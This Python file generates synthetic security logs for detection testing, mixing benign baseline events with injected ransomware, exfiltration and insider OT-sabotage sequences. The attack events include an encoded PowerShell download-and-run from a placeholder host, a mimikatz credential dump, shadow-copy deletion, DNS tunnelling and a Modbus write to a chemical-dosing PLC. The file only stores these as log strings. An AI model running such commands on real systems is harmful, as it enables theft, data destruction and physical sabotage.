import random
from datetime import datetime, timedelta
from typing import List, Dict, Any

class SimulationEngine:
    def __init__(self):
        self.hosts = [
            {"hostname": "SRV-DC-01", "ip": "192.168.1.10", "type": "Server", "env": "IT", "crit": 95},
            {"hostname": "SRV-APP-02", "ip": "192.168.1.15", "type": "Server", "env": "IT", "crit": 80},
            {"hostname": "WKSTN-FIN-08", "ip": "192.168.1.50", "type": "Endpoint", "env": "IT", "crit": 60},
            {"hostname": "WKSTN-DEV-12", "ip": "192.168.1.55", "type": "Endpoint", "env": "IT", "crit": 50},
            {"hostname": "FW-PERIMETER-01", "ip": "192.168.1.1", "type": "Firewall", "env": "IT", "crit": 90},
            {"hostname": "HMI-WATER-PUMP-01", "ip": "10.0.4.12", "type": "SCADA/PLC", "env": "OT", "crit": 100},
            {"hostname": "PLC-CHEM-DOSING-02", "ip": "10.0.4.20", "type": "SCADA/PLC", "env": "OT", "crit": 100}
        ]
        self.users = ["j.smith", "a.davis", "m.taylor", "administrator", "service_acct_ot", "r.insider"]

    def generate_synthetic_events(self, count: int = 1000, scenario: str = "ransomware") -> List[Dict[str, Any]]:
        """
        Generates synthetic security log events modeling enterprise baseline telemetry
        along with injected multi-stage APT attack sequences.
        """
        events = []
        now = datetime.utcnow()

        # Generate background benign baseline logs
        for i in range(count):
            host = random.choice(self.hosts)
            user = random.choice(self.users)
            delta_seconds = random.randint(1, 3600 * 24)
            evt_time = now - timedelta(seconds=delta_seconds)

            src_type = random.choice(["Sysmon", "LinuxAudit", "Firewall", "DNS", "VPN", "Auth"])
            
            if src_type == "Auth":
                cmd = f"User authentication success for {user}"
                code = "4624"
            elif src_type == "Sysmon":
                cmd = f"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule"
                code = "1"
            elif src_type == "DNS":
                cmd = f"Query A internal-domain.local"
                code = "22"
            else:
                cmd = f"ALLOW TCP 192.168.1.{random.randint(10,200)} -> 8.8.8.8:443"
                code = "200"

            events.append({
                "id": f"evt_sim_{i+1}",
                "timestamp": evt_time.isoformat(),
                "source_type": src_type,
                "hostname": host["hostname"],
                "source_ip": host["ip"],
                "destination_ip": f"192.168.1.{random.randint(1, 254)}",
                "source_port": random.randint(1024, 65535),
                "destination_port": random.choice([80, 443, 53, 22, 445]),
                "user_name": user,
                "process_name": cmd.split()[0] if cmd else "system",
                "process_command_line": cmd,
                "event_code": code,
                "raw_payload": {"simulated": True, "event_id": i+1},
                "anomaly_score": 0.05,
                "is_anomaly": False
            })

        # Inject Attack Scenario Specific Sequences
        if scenario == "ransomware":
            events.extend(self._get_ransomware_scenario_logs(now))
        elif scenario == "exfiltration":
            events.extend(self._get_exfiltration_scenario_logs(now))
        elif scenario == "insider_ot":
            events.extend(self._get_insider_ot_scenario_logs(now))

        # Sort by timestamp
        events.sort(key=lambda x: x["timestamp"])
        return events

    def _get_ransomware_scenario_logs(self, base_time: datetime) -> List[Dict[str, Any]]:
        return [
            {
                "id": "evt_atk_1",
                "timestamp": (base_time - timedelta(minutes=15)).isoformat(),
                "source_type": "Sysmon",
                "hostname": "WKSTN-FIN-08",
                "source_ip": "192.168.1.50",
                "destination_ip": "198.51.100.42",
                "source_port": 49152,
                "destination_port": 443,
                "user_name": "j.smith",
                "process_name": "WINWORD.EXE",
                "process_command_line": "WINWORD.EXE C:\\Users\\j.smith\\Downloads\\Invoice_Urgent.docm",
                "event_code": "1",
                "raw_payload": {"attack_stage": "Initial Access - Spearphishing"},
                "anomaly_score": 0.78,
                "is_anomaly": True
            },
            {
                "id": "evt_atk_2",
                "timestamp": (base_time - timedelta(minutes=14)).isoformat(),
                "source_type": "Sysmon",
                "hostname": "WKSTN-FIN-08",
                "source_ip": "192.168.1.50",
                "destination_ip": "198.51.100.42",
                "source_port": 49153,
                "destination_port": 443,
                "user_name": "j.smith",
                "process_name": "powershell.exe",
                "process_command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA",
                "event_code": "1",
                "raw_payload": {"attack_stage": "Execution - Encrypted PowerShell C2"},
                "anomaly_score": 0.95,
                "is_anomaly": True
            },
            {
                "id": "evt_atk_3",
                "timestamp": (base_time - timedelta(minutes=10)).isoformat(),
                "source_type": "Sysmon",
                "hostname": "WKSTN-FIN-08",
                "source_ip": "192.168.1.50",
                "destination_ip": "192.168.1.10",
                "source_port": 49160,
                "destination_port": 445,
                "user_name": "administrator",
                "process_name": "mimikatz.exe",
                "process_command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
                "event_code": "10",
                "raw_payload": {"attack_stage": "Credential Access - LSASS Dump"},
                "anomaly_score": 0.99,
                "is_anomaly": True
            },
            {
                "id": "evt_atk_4",
                "timestamp": (base_time - timedelta(minutes=5)).isoformat(),
                "source_type": "Sysmon",
                "hostname": "SRV-DC-01",
                "source_ip": "192.168.1.50",
                "destination_ip": "192.168.1.10",
                "source_port": 49175,
                "destination_port": 135,
                "user_name": "administrator",
                "process_name": "wmic.exe",
                "process_command_line": "wmic.exe /node:192.168.1.10 process call create 'cmd.exe /c vssadmin delete shadows /all /quiet'",
                "event_code": "1",
                "raw_payload": {"attack_stage": "Impact - Shadow Copy Deletion"},
                "anomaly_score": 0.99,
                "is_anomaly": True
            }
        ]

    def _get_exfiltration_scenario_logs(self, base_time: datetime) -> List[Dict[str, Any]]:
        return [
            {
                "id": "evt_exfil_1",
                "timestamp": (base_time - timedelta(minutes=20)).isoformat(),
                "source_type": "VPN",
                "hostname": "VPN-GW-01",
                "source_ip": "203.0.113.15",
                "destination_ip": "192.168.1.1",
                "source_port": 51423,
                "destination_port": 443,
                "user_name": "m.taylor",
                "process_name": "openvpn",
                "process_command_line": "VPN authentication success from unusual country (RU)",
                "event_code": "VPN_LOGIN",
                "raw_payload": {"attack_stage": "Initial Access - Compromised VPN"},
                "anomaly_score": 0.85,
                "is_anomaly": True
            },
            {
                "id": "evt_exfil_2",
                "timestamp": (base_time - timedelta(minutes=8)).isoformat(),
                "source_type": "DNS",
                "hostname": "SRV-APP-02",
                "source_ip": "192.168.1.15",
                "destination_ip": "8.8.8.8",
                "source_port": 53535,
                "destination_port": 53,
                "user_name": "m.taylor",
                "process_name": "dnscat2",
                "process_command_line": "nslookup 5345637265745f64617461.bad-domain-exfil.com",
                "event_code": "22",
                "raw_payload": {"attack_stage": "Exfiltration - DNS Tunneling"},
                "anomaly_score": 0.94,
                "is_anomaly": True
            }
        ]

    def _get_insider_ot_scenario_logs(self, base_time: datetime) -> List[Dict[str, Any]]:
        return [
            {
                "id": "evt_ot_1",
                "timestamp": (base_time - timedelta(minutes=12)).isoformat(),
                "source_type": "Sysmon",
                "hostname": "HMI-WATER-PUMP-01",
                "source_ip": "10.0.4.12",
                "destination_ip": "10.0.4.20",
                "source_port": 502,
                "destination_port": 502,
                "user_name": "r.insider",
                "process_name": "python.exe",
                "process_command_line": "python.exe C:\\Temp\\modbus_exploit.py --write-register 40001 --value 9999",
                "event_code": "1",
                "raw_payload": {"attack_stage": "OT Sabotage - Chemical Dosing Register Override"},
                "anomaly_score": 0.98,
                "is_anomaly": True
            }
        ]

simulator_engine = SimulationEngine()
